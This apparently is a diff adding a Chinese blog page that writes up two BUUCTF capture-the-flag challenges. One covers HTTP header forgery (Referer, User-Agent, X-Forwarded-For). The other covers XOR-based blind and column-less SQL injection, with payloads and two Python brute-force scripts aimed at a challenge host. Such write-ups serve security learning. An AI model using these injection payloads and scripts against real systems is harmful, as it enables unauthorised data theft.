@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[极客大挑战 2019]Http	[GYCTF2020]Ezsqli">
+<meta property="og:type" content="website">
+<meta property="og:title" content="buuctf的部分解题">
+<meta property="og:url" content="http://example.com/exp/question%20twelve.html">
+<meta property="og:site_name" content="Once">
+<meta property="og:description" content="[极客大挑战 2019]Http	[GYCTF2020]Ezsqli">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/exp/question%20twelve.htm/image-20230108185150511.png">
+<meta property="article:published_time" content="2023-09-16T12:16:19.221Z">
+<meta property="article:modified_time" content="2023-01-11T13:27:16.418Z">
+<meta property="article:author" content="Once">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/exp/question%20twelve.htm/image-20230108185150511.png">
+
+<link rel="canonical" href="http://example.com/exp/question%20twelve">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>buuctf的部分解题 | Once
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Once</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">26</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">buuctf的部分解题
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>[极客大挑战 2019]Http	[GYCTF2020]Ezsqli</p>
+<span id="more"></span>
+
+<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>1.打开网页后查看网页源代码，看到有一个<code>Secret.php</code>，打开查看显示<code>It doesn&#39;t come from &#39;https://Sycsecret.buuoj.cn&#39;</code></p>
+<p>2.然后使用burp抓包，在<img src="/exp/question%20twelve.htm/image-20230108185150511.png" alt="image-20230108185150511"></p>
+<p>中填入<code>Referer: https://Sycsecret.buuoj.cn</code>回显得到<code>请使用 Syclover 浏览器</code>，然后就将<code>User-Agent</code>头处改为<code>Syclover</code></p>
+<p>3.然后回显<code>只能在本地</code>，那么就再加入<code>X-Forwarded-For:127.0.0.1</code>，最终得到flag</p>
+<h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><p>1.打开网页显示可以提交一些东西，先提交一个<code>1</code>，回显<code>Nu1L</code>，应该这就相当于正确</p>
+<p>再使用<code>1&#39;</code>和<code>1&quot;</code>都回显<code>bool(false)</code>，应该就是不对，使用<code>union，or，and</code>都是回显<code>bool(false)</code></p>
+<p>2.然后看wp是可以使用<code>^、&amp;&amp;和if</code></p>
+<p>^的用法是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1^1=0 </span><br><span class="line">0^0=0 </span><br><span class="line">1^0=1 </span><br><span class="line">0^1=1</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以构造出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(ascii(substr(database(),1,1))&gt;32)</span><br></pre></td></tr></table></figure>
+
+<p>这样回显<code>Nu1L</code>，说明可以使用</p>
+<p>3.可以利用这个进行爆表，但是<code>information_schema</code>被过滤，可以使用<code>sys.x$schema_table_statistics_with_buffer</code>来代替，构造例如以下的payload，如果<code>^</code>后面的是正确就会返回1，不对就会返回0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema = database()),1,1))&gt;32)</span><br></pre></td></tr></table></figure>
+
+<p>所以可以使用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://338b2055-2f67-4287-ba18-35862dced5ca.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_table():</span><br><span class="line">    table1_name = &#x27;&#x27;</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        for k in range(32, 127):</span><br><span class="line">            data = &#123;&#x27;id&#x27;: &quot;0^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema = database()),%d,1))=%d)&quot; % (j, k)&#125;</span><br><span class="line">            res = requests.post(url,data=data)</span><br><span class="line">            if &quot;Nu1L&quot; in res.text:</span><br><span class="line">                table1_name += chr(k)</span><br><span class="line">                print(table1_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_table()</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>f1ag_1s_h3r3_hhhhh,users233333333333333</code>两张表，猜测flag在<code>f1ag_1s_h3r3_hhhhh</code>表中</p>
+<p>4.但是因为得不到列名，所以需要使用无列名注入，先使用payload判断一下f1ag_1s_h3r3_hhhhh有几个列，使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0^( (select 1) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br><span class="line"></span><br><span class="line">回显bool(false)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0^( (select 1,1) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br><span class="line"></span><br><span class="line">回显Nu1L</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0^( (select 1,1,1) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br><span class="line"></span><br><span class="line">回显bool(false)</span><br></pre></td></tr></table></figure>
+
+<p>说明有两列</p>
+<p>5.使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0^( (select 1,&#x27;f&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br><span class="line"></span><br><span class="line">回显Error Occured When Fetch Result.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0^( (select 1,&#x27;g&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br><span class="line"></span><br><span class="line">回显Nu1L</span><br></pre></td></tr></table></figure>
+
+<p>说明第一个字符就是<code>f</code>，再使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0^( (select 1,&#x27;fl&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br><span class="line"></span><br><span class="line">回显Error Occured When Fetch Result.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0^( (select 1,&#x27;fm&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br><span class="line"></span><br><span class="line">回显Nu1L</span><br></pre></td></tr></table></figure>
+
+<p>这就说明第二个字符是<code>l</code>，根据这个，来写脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url=&#x27;http://338b2055-2f67-4287-ba18-35862dced5ca.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line"></span><br><span class="line">result=&#x27;&#x27;</span><br><span class="line">def add(result):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    res += result</span><br><span class="line">    return res</span><br><span class="line">for a in range(1,200):</span><br><span class="line">    for i in range(32, 128):</span><br><span class="line">        k = add(result + chr(i))</span><br><span class="line">        datas = &#123;&#x27;id&#x27;: &#x27;0^( (select 1,&quot;%s&quot;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&#x27; % (k)&#125;</span><br><span class="line">        re = requests.post(url, data=datas)</span><br><span class="line">        if &#x27;Nu1L&#x27; in re.text:</span><br><span class="line">            result += chr(i - 1)</span><br><span class="line">            print(result)</span><br><span class="line">            time.sleep(2)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>最终得到flag</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">1.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GYCTF2020-Ezsqli"><span class="nav-number">2.</span> <span class="nav-text">[GYCTF2020]Ezsqli</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Once"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">Once</p>
+  <div class="site-description" itemprop="description">forever</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer">
+   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66">
+   </iframe>
+  </div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">world</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'PZfVYAl8hrPpczg4EF7C05Rh-gzGzoHsz',
+      appKey     : 'cx8a6nD3cI8V4erQeXcAarYz',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
